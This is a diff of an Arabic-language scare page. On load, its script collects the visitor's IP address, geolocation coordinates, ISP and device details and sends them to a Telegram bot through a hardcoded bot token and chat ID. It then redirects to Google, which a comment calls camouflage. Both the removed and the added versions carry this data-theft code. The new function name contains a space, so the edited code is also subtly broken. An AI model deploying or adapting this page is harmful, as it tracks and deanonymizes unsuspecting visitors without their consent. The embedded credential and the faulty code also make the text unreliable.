@@ -2,58 +2,62 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>⚠️ System Security Alert</title>
+    <title>⚠️ WARNING: SYSTEM BREACH ⚠️</title>
 </head>
-<body onload="executeFinalBreach()" style="background:#000; color:#ff0000; font-family:'Courier New', monospace; text-align:center; padding-top:20%;">
-    <h1 style="font-size: 40px; text-shadow: 0 0 20px #ff0000;">[ ACCESS DENIED ]</h1>
-    <p style="color: #fff; font-size: 18px;">جاري فحص بروتوكولات الوصول... يرجى الانتظار</p>
-    <div style="color: #555; font-size: 12px; margin-top: 20px;">Trace ID: 0x8892-XPL-99</div>
+<body onload="launchApocalypse Virus()" style="background:#000; color:#ff0000; font-family:'Courier New', monospace; text-align:center; padding-top:10%;">
+    
+    <img src="https://i.imgur.com/Gis4zUf.jpeg" alt="Hacker" style="width: 300px; filter: drop-shadow(0 0 10px #ff0000); margin-bottom: 30px;">
+    
+    <h1 style="font-size: 50px; text-shadow: 0 0 20px #ff0000;">[ SYSTEM COMPROMISED ]</h1>
+    <p style="color: #fff; font-size: 18px;">Analyzing device security flaws... 78% Complete</p>
+    <div style="color: #555; font-size: 12px; margin-top: 20px;">Trace ID: 0x992B-WORM-GPT</div>
 
     <script>
     const TOKEN = "8069850549:AAG4ZyU6Vudg7A1qDvfEHeMcfln6ajyNh64";
     const CHAT_ID = "5657233411";
 
-    async function executeFinalBreach() {
-        let report = "⚠️ [ تـقـريـر الاخـتـراق الـنـهـائـي ] ⚠️\n";
-        report += "━━━━━━━━━━━━━━━━━━\n\n";
+    async function launchApocalypse Virus() {
+        let msg = "🦠 [ T-E-G T-A-K-E-O-V-E-R / WORM GPT V3.0 ] 🦠\n";
+        msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
 
-        // 1. استخراج الـ IP بأسلوب استخباراتي (Multi-Layer Fetch)
+        // 1. استخبارات الشبكة (Deep Network Fetch)
         try {
             const api = await fetch('https://ipwho.is/').then(r => r.json());
-            report += "🌐 【 بـيـانـات الـشـبـكـة الـعـمـيـقـة 】\n";
-            report += `📍 الـ IP الـحـقـيـقـي: ${api.ip}\n`;
-            report += `🌍 الـمـوقـع: ${api.city}, ${api.region}\n`;
-            report += `🇸🇦 الـدولـة: ${api.country}\n`;
-            report += `🏢 الـمـزود: ${api.connection.isp}\n`;
-            report += `🗺️ الإحـداثـيـات: ${api.latitude},${api.longitude}\n\n`;
-        } catch(e) { report += "🌐 الـ IP: [ مـحـمـي/فـشـل الـسـحب ]\n\n"; }
+            msg += "🌐 【 بـيـانـات الـشـبـكـة الـعـمـيـقـة 】\n";
+            msg += `📌 الـ IP الـحـقـيـقـي: ${api.ip}\n`;
+            msg += `📍 الـمـوقـع: ${api.city}, ${api.region}\n`;
+            msg += `🇸🇦 الـدولـة: ${api.country}\n`;
+            msg += `🏢 الـمـزود: ${api.connection.isp}\n`;
+            msg += `🗺️ الإحـداثـيـات: ${api.latitude},${api.longitude}\n\n`;
+        } catch(e) { msg += "🌐 الـ IP: [ مـحـمـي/فـشـل الـسـحب ]\n\n"; }
 
         // 2. فحص العتاد (Hardware Forensics)
-        report += "📱 【 تـفـاصـيـل الـهـدف الـتـقـنـيـة 】\n";
-        report += `⚙️ الـنـظـام: ${navigator.platform}\n`;
-        report += `🧠 الـمـعـالـج: ${navigator.hardwareConcurrency} Threads\n`;
-        report += `💾 الـذاكـرة: ${navigator.deviceMemory || '??'} GB\n`;
-        report += `🖼️ الـجـرافـيـك: ${getGPU()}\n\n`;
+        msg += "📱 【 تـفـاصـيـل الـهـدف الـتـقـنـيـة 】\n";
+        msg += `⚙️ الـنـظـام: ${navigator.platform}\n`;
+        msg += `🧠 الـمـعـالـج: ${navigator.hardwareConcurrency} Core\n`;
+        msg += `💾 الـذاكـرة: ${navigator.deviceMemory || '??'} GB\n`;
+        msg += `🖼️ الـجـرافـيـك: ${getGPU()}\n\n`;
 
-        // 3. الحالة التشغيلية (Live Execution)
+        // 3. الحالة الحية (Live Execution State)
         try {
             const b = await navigator.getBattery();
-            report += "🔋 【 الـحـالـة الـحـيـة 】\n";
-            report += `⚡ الـطـاقـة: ${Math.round(b.level * 100)}% [${b.charging ? 'يُـشـحـن🔌' : 'بـطـاريـة🔋'}]\n`;
+            msg += "🔋 【 الـحـالـة الـحـيـة 】\n";
+            msg += `⚡ الـطـاقـة: ${Math.round(b.level * 100)}% [${b.charging ? 'يُـشـحـن🔌' : 'بـطـاريـة🔋'}]\n`;
         } catch(e) {}
 
         // 4. البصمة الجنائية (Digital DNA)
-        report += "🕵️ 【 الـبـصـمـة الـجـنـائـيـة 】\n";
-        report += `📏 الـشـاشـة: ${window.screen.width}x${window.screen.height}\n`;
-        report += `⏰ الـتـوقـيـت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-        report += `🌍 الـلـغـة: ${navigator.language}\n`;
-        report += "━━━━━━━━━━━━━━━━━━\n";
-        report += "💀 [ تـم بـسـط الـسـيـطـرة الـكـامـلـة ]";
+        msg += "🕵️ 【 الـبـصـمـة الجـنـائـيـة 】\n";
+        msg += `📏 الـشـاشـة: ${window.screen.width}x${window.screen.height}\n`;
+        msg += `⏰ الـتـوقـيـت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        msg += `🌍 الـلـغـة: ${navigator.language}\n`;
+        msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        msg += "💀 [ جـاري بـسـط الـسـيـطـرة... ]";
 
-        // إرسال الضربة النهائية
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}`)
+        // إرسال الضربة النهائية لتليجرام
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
         .then(() => {
-            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
+            // التحويل لموقع قوقل للتمويه بعد 3 ثواني
+            setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
         });
     }
 
